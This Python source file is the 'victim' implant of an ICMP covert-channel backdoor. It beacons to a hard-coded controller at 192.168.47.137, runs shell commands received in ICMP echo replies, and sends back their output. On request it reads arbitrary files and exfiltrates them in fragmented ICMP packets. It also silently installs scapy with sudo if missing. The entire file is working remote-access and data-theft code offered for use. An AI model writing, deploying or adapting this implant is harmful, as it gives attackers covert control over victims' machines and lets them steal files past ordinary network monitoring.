import netifaces
import signal
import time
import sys
from subprocess import PIPE, Popen, run

# Third-Party imports
try:
    from scapy.all import *
except ImportError:
    subprocess.run(["sudo", "apt-get", "install", "-y", "python3-scapy"])
    from scapy.all import *


class Victim:
    """ Represents a victim machine that communicates with a server using ICMP messages."""
    
    # Constants
    SERVER_IP = "192.168.47.137"
    ECHO_REQUEST = "echo-request"
    UTF_8 = "utf-8"
    ICMP_REPLY = "icmp[0]=0"
    PACKET_MAX_SIZE = 1000

    def __init__(self):
        """Initialize the victim by choosing a network interface."""
        self.interface = self.choose_interface()

    @staticmethod
    def signal_handler(sig, frame):
        """Terminate the application upon receiving a system signal."""
        sys.exit(0)

    @staticmethod
    def choose_interface():
        """
        Choose a network interface, ignoring the loopback interface.
        Returns:
            str: Name of the chosen network interface.
        """
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            if interface == "lo":
                continue
            details = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in details:
                return interface
        sys.exit()

    def send_hello(self):
        """Periodically send a hello message to the server to indicate availability."""
        while True:
            send(IP(dst=Victim.SERVER_IP) / ICMP(type=Victim.ECHO_REQUEST, id=0x001) / "hey server, i'm available", verbose=False)
            time.sleep(5)

    def send_packet(self, payload, pkt):
        """Send an ICMP packet with specified payload to the server."""
        send(IP(dst=Victim.SERVER_IP) / ICMP(type=Victim.ECHO_REQUEST, id=pkt[ICMP].id) / payload, verbose=False)

    def fragment_packet(self, payload, prefix, pkt):
        """
        Fragment and send payloads exceeding PACKET_MAX_SIZE.
        Args:
            payload (str): The payload data to send.
            prefix (str): The prefix for each fragment.
            pkt: The packet object to respond to.
        """
        for chunk in range(0, len(payload), Victim.PACKET_MAX_SIZE):
            curr = chunk
            self.send_packet(prefix + payload[curr:curr + Victim.PACKET_MAX_SIZE], pkt)

    def send_file(self, file_name, pkt):
        """
        Send a specified file to the server.
        If the file is not found or cannot be read, an error message is sent back to the server.
        Args:
            file_name (str): Name of the file to send.
            pkt: The packet object to respond to.
        """
        try:
            with open(file_name, "rb") as current_file:
                content = current_file.read()
                self.fragment_packet(content, file_name.encode(), pkt)
            self.send_packet("file sending completed", pkt)
        except:
            self.send_packet(f"file '{file_name}' not found", pkt)

    def run_command(self, payload, pkt):
        """
        Execute a command and send the output to the server.
        Args:
            payload (str): The command to run.
            pkt: The packet object to respond to.
        """
        process = Popen(payload[4:], shell=True, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        return_code = process.returncode
        reply = "stdout: {}\nstderr: {}return code: {}".format(stdout.decode(Victim.UTF_8), stderr.decode(Victim.UTF_8),
                                                               return_code)
        if len(reply) > Victim.PACKET_MAX_SIZE:
            self.fragment_packet(reply, "", pkt)
        else:
            self.send_packet(reply, pkt)

    def handle_pkt(self, pkt):
        """Process incoming packets to check for commands or file requests."""
        payload = pkt[0][Raw].load.decode(Victim.UTF_8)
        
        if payload != "hey server, i'm available":
            command_array = payload.split(" ")
            if command_array[0] == "send":
                self.send_file(command_array[1], pkt)
            elif command_array[0] == "run":
                self.run_command(payload, pkt)

    def sniff_and_process(self):
        """Continuously sniff incoming packets and process them."""
        while True:
            sniff(iface=self.interface, filter=Victim.ICMP_REPLY, prn=self.handle_pkt, store=False)

    def start(self):
        """Start sending hello messages and processing incoming packets."""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        send_hello_thread = threading.Thread(target=self.send_hello)
        sniff_thread = threading.Thread(target=self.sniff_and_process)
        
        send_hello_thread.start()
        sniff_thread.start()
        
        send_hello_thread.join()
        sniff_thread.join()


if __name__ == "__main__":
    victim = Victim()
    victim.start()
